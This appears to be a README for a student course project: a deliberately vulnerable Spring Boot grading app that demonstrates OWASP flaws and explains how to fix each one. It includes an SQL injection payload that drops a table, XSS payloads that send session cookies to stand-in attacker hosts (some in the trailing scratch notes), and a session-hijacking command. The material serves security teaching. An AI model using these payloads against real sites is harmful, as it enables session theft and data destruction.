# Cyber Security Base 2019 -project

This app is a project created for MOOC course Cyber Security Base 2019-2020.

## Project description
In the first course project, your task is to create a web application that has at least five different flaws from the OWASP top ten list (https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf).


## Project essay
LINK: https://github.com/nurvel/spring-owasp-vulnerable-app

The app is created with Spring Boot. You can start up the app in IDE or on command line with '''mvn spring-boot:run'''
Server will start to port 8080, navigate to localhost:8080.
To checkout the DB go to localhost:8080/H2-console.
The database is H2 and will be initialized with necessary data on every startup. If you want to reset, just restart the app.

Log in as student:
Username: student
Password: password

Log in as teacher:
Username: teacher
Password: password


### FLAW 1: A1:2017-Injection
#### OWASP description of the security flaw:
> Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent
to an interpreter as part of a command or query. The attacker’s hostile data can trick the
interpreter into executing unintended commands or accessing data without proper authorization.

#### How the security flaw behaves in the app
In the URL http://localhost:8080/course it is possible to give feedback and have a discussion about the courses. This comment field enables user to inject SQL statements to the database. This is due that the implementation of the database query is done without sanitizing the input from the user.

One can destroy the database by typing the following ):
```
Bye bye courses!') ; DROP TABLE course; --
```
#### How to fix the security flaw in the app
In the CourseController in method courseFeedback the INSERT statement is created with plain SQL-statement that does not sanitize the input. To fix this issue the input should be done using methods that the CourseRepository object provides or sanitizing the input using PreparedStatement.

### FLAW 2: A2:2017-Broken Authentication
>Application functions related to authentication and session management are often implemented
incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit
other implementation flaws to assume other users’ identities temporarily or permanently.

#### How the security flaw behaves in the app
The setting for Session cookie http-only is set as false. This enables the browser to toggle the session cookie and modify it. If the attacker can obtain the session cookie from an other user, they can assume as the other user. In this app the student can steal the identity of a teacher an modify the grades of students. How to steal the cookie in A7:2017-Cross-Site Scripting (XSS).

If the attacker can obtain the session cookie, it can be changed in the developer console typing in:
```
document.cookie="JSESSIONID=INSERT_THE_STOLEN_ID_HERE"
```

#### How to fix the security flaw in the app
The setting is set as true by default in Spring. The application properties has settings that has set it to false - this should be modified as below:
```
server.servlet.session.cookie.http-only=true
```

### FLAW 3: A3:2017-Sensitive Data Exposure
> Many web applications and APIs do not properly protect sensitive data, such as financial,
healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit
card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra
protection, such as encryption at rest or in transit, and requires special precautions when
exchanged with the browser.

#### How the security flaw behaves in the app
Student should be allowed only to see their own grades in their personal page. The app allows the user to guess the ID of other students and go to their personal pages by typing the ID in the URL as a parameter
```
http://localhost:8080/student/INSERT_ID_HERE
```

#### How to fix the security flaw in the app
The request is handeled in the StudentController-class method studentInfo. There should be validation that the logged in student is the actual student that matches the id. The authenticated user can be obtained with the code below. This also makes makes the id-parameter in the URL obsolete in this use case.
```
Account account =  accountService.getAutenticatedUser();
```

### FLAW 4: A5:2017-Broken Access Control
>Restrictions on what authenticated users are allowed to do are often not properly enforced.
Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access
other users' accounts, view sensitive files, modify other users’ data, change access rights, etc.

#### How the security flaw behaves in the app
There is a URL that the teachers use to give grades to students in courses. There is a link in the navigation bar for teachers if they are signed in, this is not visible to students. But if a student knows that this URL does exist, they can enter the area called "Teachers Lounge" by typing in the url: http://localhost:8080/lounge . Accessing this page does NOT enable the student to modify grades, since the method is secured for only the teachers in the back-end.

#### How to fix the security flaw in the app
The ULR path to the Teachers Lounge should be limited to only users with teacher roles. This can be done in the class SecurityConfiguration by adding configuring to the URL path as follows (Also the H2 DB URL should be configured to only admin etc.):
```
.antMatchers(HttpMethod.GET, "/lounge").hasAnyAuthority("TEACHER")

```


### FLAW 5: A7:2017-Cross-Site Scripting (XSS)
#### OWASP description of the security flaw:
>XSS flaws occur whenever an application includes untrusted data in a new web page without
proper validation or escaping, or updates an existing web page with user-supplied data using a
browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the
victim’s browser which can hijack user sessions, deface web sites, or redirect the user to
malicious sites.

#### How the security flaw behaves in the app
Users can comment the courses in the URL http://localhost:8080/course . The comments that are presented in the page are not sanitized for XSS, meaning that the user can inject JavaScript to the page. This voulnerability together with the session-cookie manipulation in the part FLAW 3: A3:2017-Sensitive Data Exposure enables the attacker to steal identity of a Teacher and manipulate grades.

1) Inject a JavaScript that sends the session cookie to malicious URL to the hacker. This has been done already by some user! Look at the developer console and network tab. Your session cookie is sent to the hacker :/ The injected string is a picture that is hidden from view:
```
I think i will manage to get 5 form all the courses! <script>document.write(\"<img src=\\\"http://www.haxor.com/cookiesteal/\" + document.cookie +\"\\\" style=\\\"display: none;\\\" />\")  </script>"
```
2) Attacker can obtain the session of a teacher by changing the session token in the developer console as described in  FLAW 3: A3:2017-Sensitive Data Exposure

#### How to fix the security flaw in the app
The thymelead file course.html does not escape the string when rendering the page. This means that the HTML tags are in use and code can be inserted to the page. This can be fixed by using th:text insted of th:utext in the rendering. 
```
<span th:text="${feedback}">feedback text</span>
```


### FLAW X: A6:2017-Security Misconfiguration
#### OWASP description of the security flaw:
>Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure
default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured
HTTP headers, and verbose error messages containing sensitive information. Not only must all
operating systems, frameworks, libraries, and applications be securely configured, but they must
be patched and upgraded in a timely fashion.

#### How the security flaw behaves in the app
H2 data base URL not secured and using default password.
#### How to fix the security flaw in the app
Change default password to H2




### FLAW 4: A10:2017-Insufficient Logging & Monitoring
#### OWASP description of the security flaw:
Insufficient logging and monitoring, coupled with missing or ineffective integration with incident
response, allows attackers to further attack systems, maintain persistence, pivot to more systems,
and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over
200 days, typically detected by external parties rather than internal processes or monitoring.
#### How the security flaw behaves in the app
#### How to fix the security flaw in the app




-- SQL injection =>  Hello insert
=> drop table?

INSERT INTO signup (address, name) VALUES ('testijuttu', 'moikka')

INSERT INTO signup (address, name) VALUES ('testijuttu', '
Bye bye courses!') ; DROP TABLE course; --
')

style=\"display: none;\"

<script>document.write("<img src=\"http://www.haxor.com/cookiesteal/" + document.cookie +"\" style=\"display: none;\" />")  </script>

# ALLA OLEVA TOIMII
<script>document.write("<img src=\"http://www.haxor.com/cookisteal/" + document.cookie +"\"/>")  </script>

<script>fetch("http://www.haxor.com/cookisteal/" + document.cookie) </script>
document.cookie="JSESSIONID=12EE43AF515F83867B20D94907108063"
<img src='https://yourserver.evil.com/collect.gif?cookie=' + document.cookie/>
